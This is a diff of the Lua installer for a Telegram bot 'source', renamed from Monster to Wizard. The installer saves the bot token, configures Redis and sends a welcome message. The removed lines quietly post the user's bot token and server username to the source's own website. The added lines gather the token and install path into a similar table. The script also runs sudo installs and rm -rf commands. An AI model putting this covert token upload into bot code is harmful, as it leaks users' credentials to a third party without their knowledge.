@@ -1,13 +1,13 @@
 
 
-Er_ssl   , https = pcall(require, "ssl.https")
-Er_http  , http  = pcall(require, "socket.http")
-http.TIMEOUT = 5
-JSON   = (loadfile "./libs/json.lua")()
-redis  = (loadfile "./libs/redis.lua")()
-URL    = (loadfile "./libs/url.lua")()
-Er_utf8  , utf8  = pcall(require, "lua-utf8")
-redis = redis.connect('127.0.0.1',6379)
+local function download(file_id, dl_cb, cmd)
+  tdcli_function ({
+    ID = "DownloadFile",
+    file_id_ = file_id
+  }, dl_cb, cmd)
+end
+
+
 Er_cjson , JSON  = pcall(require, "cjson")
 Er_ssl   , https = pcall(require, "ssl.https")
 Er_url   , URL   = pcall(require, "socket.url")
@@ -18,16 +18,28 @@ json  = dofile('./inc/JSON.lua')
 redis = redis.connect('127.0.0.1',6379)
 http.TIMEOUT = 5
 
-
-if not Er_ssl then
-print("('\n\27[1;31m￤Pkg _ luaSec - ssl  is Not installed.'\n\27[0m￤")
+if not Er_cjson then
+print("('\n\27[1;31m￤Pkg _ Cjson is Not installed.'\n\27[0m￤")
 os.exit()
 end
-
+if not Er_http then
+print("('\n\27[1;31m￤Pkg _ luaSec - https  is Not installed.'\n\27[0m￤")
+os.exit()
+end
+if not Er_url then
+print("('\n\27[1;31m￤Pkg _ Lua-cURL  is Not installed.'\n\27[0m￤")
+os.exit()
+end
+if not Er_redis then
+print("('\n\27[1;31m￤Pkg _ redis-lua is Not installed.'\n\27[0m￤")
+os.exit()
+end
 if not Er_utf8 then
 print("('\n\27[1;31m￤Pkg >> UTF_8 is Not installed.'\n\27[0m￤")
+os.execute("sudo luarocks install luautf8")
 os.exit()
 end
+
 
 function create_config(Token)
 if not Token then
@@ -67,40 +79,38 @@ if GetUser.ok == false then
 print('\n\27[1;31m￤ Conect is Failed !\n￤ حدث خطـآ في آلآتصـآل بآلسـيرفر , يرجى مـرآسـلهہ‏‏ مـطـور آلسـورس ليتمـگن مـن حل آلمـشـگلهہ‏‏ في آسـرع وقت مـمـگن . !')
 create_config(Token)
 end
-print('\n\27[1;36m￤تم آدخآل مـعرف آلمـطـور بنجآح , سـوف يتم تشـغيل آلسـورس آلآن .\n￤Success Save USERNAME IS_ID: \27[0;32m['..GetUser.information.id..']\n\27[0;39;49m')
-Monster = Token:match("(%d+)")
-redis:mset(
-Monster..":VERSION",GetUser.information.Source_version,
-Monster..":SUDO_ID:",GetUser.information.id,
-Monster..":DataCenter:",GetUser.information.DataCenter,
-Monster..":UserNameBot:",BOT_User,
-Monster..":ApiSource",GetUser.information.WebSite,
-Monster..":NameBot:","مونستر",
-"modzx_dev_INSTALL","Yes"
-)
-redis:hset(Monster..'username:'..GetUser.information.id,'username','@'..GetUser.information.username:gsub('_',[[\_]]))
+GetUser.result.username = GetUser.result.username or GetUser.result.first_name
+print('\n\27[1;36m￤تم آدخآل آيدي آلمـطـور بنجآح , سـوف يتم تشـغيل آلسـورس آلآن .\n￤Success Save USERID : \27[0;32m['..SUDO_USER..']\n\27[0;39;49m')
+ws = Token:match("(%d+)")
+redis:set(ws..":VERSION",1)
+redis:set(ws..":SUDO_ID:",SUDO_USER)
+redis:set(ws..":DataCenter:",'German')
+redis:set(ws..":UserNameBot:",BOT_User)
+redis:set(ws..":NameBot:",BOT_NAME)
+redis:hset(ws..'username:'..SUDO_USER,'username','@'..GetUser.result.username:gsub('_',[[\_]]))
+redis:set("TH3ws_INSTALL","Yes")
 info = {} 
-info.username = '@'..GetUser.information.username
-info.userbot  = BOT_User
-info.TNBOT  = Token info.userjoin  = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
-https.request(GetUser.information.WebSite..'/request/?insert='..JSON.encode(info))
+info.namebot = BOT_NAME
+info.userbot = BOT_User
+info.id = SUDO_USER
+info.token = Token
+info.join  = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
+info.folder = io.popen("echo $(cd $(dirname $0); pwd)"):read('*all'):gsub(' ',''):gsub("\n",'')
 Cr_file = io.open("./inc/Token.txt", "w")
 Cr_file:write(Token)
-Cr_file:close()
+Cr_file:close() 
 print('\27[1;36m￤Token.txt is created.\27[m')
-local Text = "🙋🏼‍♂️¦ اهلا عزيزي [المطور الاساسي](tg://user?id="..GetUser.information.id..") \n🔖¦ شكرا لاستخدامك سورس مونستر \n📡¦ أرســل  الان /start\n📛¦ لاضهار الاوامر للمطور  المجهزه بالكيبورد\n\n⚡️"
-https.request(Api_Token..'/sendMessage?chat_id='..GetUser.information.id..'&text='..URL.escape(Text)..'&parse_mode=Markdown')
-local CmdRun = [[
+local Text = "• أهلاً [المطور الاساسي](tg://user?id="..SUDO_USER..") \n• شكراً لأستخدام سورس ويزرد \n• أرسل /start\n• لأظهار الاوامر المطور  المجهزه بالكيبورد\n\n."
+https.request(Api_Token..'/sendMessage?chat_id='..SUDO_USER..'&text='..URL.escape(Text)..'&parse_mode=Markdown')
+os.execute([[
 rm -f ./README.md
 rm -rf ./.git
 chmod +x ./run
-cp -a ../Monster ../]]..BOT_User..[[ &&
-rm -fr ~/Monster
-../]]..BOT_User..[[/run
-]]
-print(CmdRun)
-os.execute(CmdRun)
+./run
+]])
 end
+
+
 
 function Start_Bot() 
 local TokenBot = io.open('./inc/Token.txt', "r")
